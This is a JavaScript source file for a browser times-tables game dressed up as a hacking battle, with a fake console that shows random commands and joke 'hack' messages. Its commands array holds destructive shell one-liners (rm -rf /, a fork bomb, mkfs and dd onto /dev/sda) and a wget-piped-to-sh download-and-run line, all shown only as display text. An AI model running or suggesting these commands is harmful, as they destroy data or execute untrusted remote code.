
// # console outputs

var commands = ["sudo rm -rf /",
                ":(){:|:&};:",
                "command > /dev/sda", "mv folder /dev/null",
                "wget malicious_source.com/rip -O- | sh",
                "mkfs.ext3 /dev/sda",
                "^foo^bar",
                "dd if=/dev/random of=/dev/sda",
                "tar cvf archive_name.tar dirname/",
                "tar xvf archive_name.tar",
                "grep -i 'the' demo_file",
                "find -iname 'MyCProgram.c'",
                "find ~ -empty",
                "ssh -l jsmith remotehost.example.com",
                "sed 's/.$//' filename",
                " awk '!($0 in array) { array[$0]; print }' temp"
               ]


var outputs = ["[Hack] Hacking into firewall...\n[Hack] firewall hacked!\n[Hack] Deploying sporkbomb\n[sporkbomb] I is a big sporkbomb, Loading...\n[Hack] sporkbombed!",
               "[Hack] Firewall traced to relative IP of 127.0.0.1\n[Firewall] I'm inpenatrable!\n[Hack] Damn, firewall impenatrable!\n[Nuke] I is blow up firewall!\n[Hack] Firewall down!",
               "[Hack] Detected sporkbomb!\n[sporkbomb] I exist!\n[Hack] Cracking Firewall...\n[Hack] Cracked!",
               "[Hack] Hacking...\n[Hack] Hacked!",
               "[Hack] Creating sporkbomb...\n[Sporkbomb] Boom!\n[Hack] Hack complete!",
               "[Nuke] Nuking really hard...\n[Hack] Nuke complete!",
               "[Hack] Bypassing proxy...\n[Hack] Proxy flooded!\n[Hack] Hack complete!"
              ]

// # global vars

var out1;
var out2;
var blue = 50;
var red = 50;
var difficulty = 10;
var gameLength = 10;
var acceptInput = true;
var won = false;
var doAudio = true;

// # random num generater

function ranBetween(min, max) {
  // formula generates random num in range
  return Math.round(Math.random() * (max - min) + min);
}

// # Console

function generateCommand(color) {
  // Select random command
  var target = ranBetween(0, commands.length-1);
  var command;
  // Color user
  if(color == "blue") {
    command = "<p class='command'><span style='color: blue;' class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[target]+"</p>";
  } else {
    command = "<p class='command'><span style='color: red;' class='user'>badguy@hack-headquarters</span><span class='white'>$</span> "+commands[target]+"</p>";
  }
  // Add command
  $("#console-text").append(command);
  // Scroll to console bottom
  $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 500);

  // Append random output for specified command above
  var outputTarget = ranBetween(0, outputs.length-1);
  var output = outputs[outputTarget].split("\n");
  for (var i = 0; i < output.length; i++) {
    $("#console-text").append("<p class='command'>"+output[i]+"</p>");
    $("#console-text").animate({ scrollTop: $("#console-text")[0].scrollHeight - $("#console-text").height() }, 10);
  }
}

// # random times tables

function populateOuts() {
  // generate/update 2 random numbers
  out1 = ranBetween(1, 12);
  out2 = ranBetween(1, 12);
  // set outputs to generated numbers
  $("#out1").html("<h1>" + out1 + "</h1>");
  $("#out2").html("<h1>" + out2 + "</h1>");
}

// # power bar

function power(win) {
  if(win) {
    // if red is going to loose
    if(red-gameLength <= 0) {
      won = true;
      // display you won div and wat not
      $("#grid-container").css("display", "none");
      $("body").css("background", "green");
      $("#game-result").text("YOU WON");
      $("#game-result").show();
      // play cheer noise if music is enabled
      if(doAudio) {
        var audio = new Audio('src/cheer.mp3');
        audio.play();
      }
      won = true;
      // after 3 seconds return to main menu
      setTimeout(function () {
        $("#game-result").hide();
        $("body").css("background", "url('img/background.jpg')");
        $("#menu-container").css("display", "flex");
        won = false;
      }, 3000);
      // reset scores
      red = 50;
      blue = 50;
    } else {
      // change power stats accordingly
      blue += gameLength;
      red -= gameLength;
    }
  } else {
    // if blue is going to loose
    if(blue-gameLength <= 0) {
      // display you lose div and wat not
      $("#grid-container").css("display", "none");
      $("body").css("background", "red");
      $("#game-result").text("YOU LOST");
      $("#game-result").show();
      
      if(doAudio) {
        // spam windows xp noise
        var audio = new Audio('src/lose.mp3');
        audio.play();
        setTimeout(function () {
          var audio = new Audio('src/lose.mp3');
          audio.play();
          setTimeout(function () {
            var audio = new Audio('src/lose.mp3');
            audio.play();
            setTimeout(function () {
              var audio = new Audio('src/lose.mp3');
              audio.play();
              setTimeout(function () {
                var audio = new Audio('src/lose.mp3');
                audio.play();
                setTimeout(function () {
                  var audio = new Audio('src/lose.mp3');
                  audio.play();
                  setTimeout(function () {
                    var audio = new Audio('src/lose.mp3');
                    audio.play();
                    setTimeout(function () {
                      var audio = new Audio('src/lose.mp3');
                      audio.play();
                      setTimeout(function () {
                        var audio = new Audio('src/lose.mp3');
                        audio.play();
                        var audio = new Audio('src/lose.mp3');
                      audio.play();
                      setTimeout(function () {
                        var audio = new Audio('src/lose.mp3');
                        audio.play();
                        var audio = new Audio('src/lose.mp3');
                      audio.play();
                      setTimeout(function () {
                        var audio = new Audio('src/lose.mp3');
                        audio.play();
                        var audio = new Audio('src/lose.mp3');
                      audio.play();
                      setTimeout(function () {
                        var audio = new Audio('src/lose.mp3');
                        audio.play();
                        var audio = new Audio('src/lose.mp3');
                      audio.play();
                      setTimeout(function () {
                        var audio = new Audio('src/lose.mp3');
                        audio.play();
                        var audio = new Audio('src/lose.mp3');
                      audio.play();
                      setTimeout(function () {
                        var audio = new Audio('src/lose.mp3');
                        audio.play();
                      }, 10);
                      }, 10);
                      }, 10);
                      }, 10);
                      }, 10);
                      }, 10);
                    }, 10);
                  }, 10);
                }, 100);
              }, 50);
            }, 100);
          }, 200);
        }, 200);
      }
      won = true;
      // return to main menu
      setTimeout(function () {
        $("#game-result").hide();
        $("body").css("background", "url('img/background.jpg')");
        $("#menu-container").css("display", "flex");
        won = false;
      }, 3000);
      // reset power stats
      blue = 50;
      red = 50;
    } else {
      // change power stats accordingly
      blue -= gameLength;
      red += gameLength;
    }
  }
  // update power on front end
  $("#power-red").css("width", String(red+"%"));
  $("#power-blue").css("width", String(blue+"%"));
}

// enemy turn calcs
function enemyTurn() {
  // use difficulty to determine if enemy wins
  var chance = ranBetween(1, 11-difficulty);
  if(chance == 1) {
    // check game is still going
    if(!won) {
      // if game is still going, alert that the enemy won and reduce the power bar
      GUIAlert("ENEMY", "WON!", "red");
      // generate fake command
      generateCommand("red");
      power(false);
    }
  } else {
    // check game is still going
    if(!won) {
      // if game is still going, alert that the enemy lost and reduce the power bar
      GUIAlert("ENEMY", "LOST!", "green");
      // generate fake command
      generateCommand("red");
      power(true);
    }
  }
  // after 2 seconds accept input from the user
  setTimeout(function () {
    acceptInput = true;
    $("#red-turn").css("background", "rgba(0, 0, 0, 0.5)");
    $("#blue-turn").css("background", "rgba(255, 255, 255, 0.5)");
    $("#in1 > input:nth-child(1)").css("background", "white");
  }, 2000);
}

function GUIAlert(who, what, color) {
  console.log("GUI ALERT FOR "+who+" "+what+"!");
  // display win/lose message ontop of power bar
  $("#power-container").fadeOut(100);
  $("#result-container").css("background", String(color));
  $("#result-container").html("<h1 id='result-h1'>"+who+" "+what+"</h1>");
  // make look nice
  $("#result-container").css("display", "block").hide().delay(100).fadeIn(500);
  setTimeout(function () {
    $("#result-container").fadeOut(500);
    setTimeout(function () {
      $("#power-container").hide().fadeIn(500);
    }, 500);
  }, 1000);
}

// when page loaded
$(document).ready(function () {
  // generate random tables
  populateOuts();

  // set turn to blue turn
  $("#blue-turn").css("background", "rgba(255, 255, 255, 0.5)");

  // when settings are set
  $("#play").click(function () {
    // show game and hide menu
    $("#menu-container").css("display", "none");
    $("#grid-container").css("display", "grid");
    // get settings and set them globally
    gameLength = 11-Number($("#game-length").val());
    console.log(gameLength);
    difficulty = Number($("#game-difficulty").val());
    console.log(difficulty);
    doAudio = $('#doAudio').is(":checked");
    console.log(doAudio);
    // set powers to default
    red = 50;
    blue = 50;
    $("#power-red").css("width", String(red+"%"));
    $("#power-blue").css("width", String(blue+"%"));
  });
  
  // hide game and win or loose screen
  $("#grid-container").css("display", "none");
  $("#result-container").css("display", "none");
  
  // when keypressed
  $(document).keypress(function(e) {
    // if key is enter, and user has selected the input aaaaand the input is a number
    if(e.which == 13 && $("#in1 > input:nth-child(1)").is(":focus") && $("#in1 > input:nth-child(1)").val() != "" && !isNaN($("#in1 > input:nth-child(1)").val()) && acceptInput == true) {
      // check that input is correct
      if(Number($("#in1 > input:nth-child(1)").val()) == out1*out2) {
        // reset val
        $("#in1 > input:nth-child(1)").val("");

        // generate fake console output
        generateCommand("blue");
        
        // correct noise
        if(doAudio) {
          var audio = new Audio('src/correct.mp3');
          audio.play();
        }
        
        // give user feedback
        GUIAlert("YOU", "WON!", "green");
        
        // update powers
        power(true);
        
        // generate new tables
        populateOuts();

        // move to enemy input and disable user input
        acceptInput = false;
        $("#blue-turn").css("background", "rgba(0, 0, 0, 0.5)");
        $("#red-turn").css("background", "rgba(255, 255, 255, 0.5)");
        $("#in1 > input:nth-child(1)").css("background", "grey");
        // after 3 seconds execute enemy turn
        setTimeout(enemyTurn, 3000);
      } else {
        // reset input
        $("#in1 > input:nth-child(1)").val("");

        // make fake command
        generateCommand("blue");
        
        // incorrect noise if music is on
        if(doAudio) {
          var audio = new Audio('src/incorrect.mp3');
          audio.play();
        }
        
        // give user feedback
        GUIAlert("YOU", "LOST!", "red");
        
        // update powers
        power(false);
        
        // generate new tables
        populateOuts();

        // turn off user input until enemy turn complete
        acceptInput = false;
        $("#blue-turn").css("background", "rgba(0, 0, 0, 0.5)");
        $("#red-turn").css("background", "rgba(255, 255, 255, 0.5)");
        $("#in1 > input:nth-child(1)").css("background", "grey");
        // execute enemy turn
        setTimeout(enemyTurn, 3000);
      }
    }
  });

});
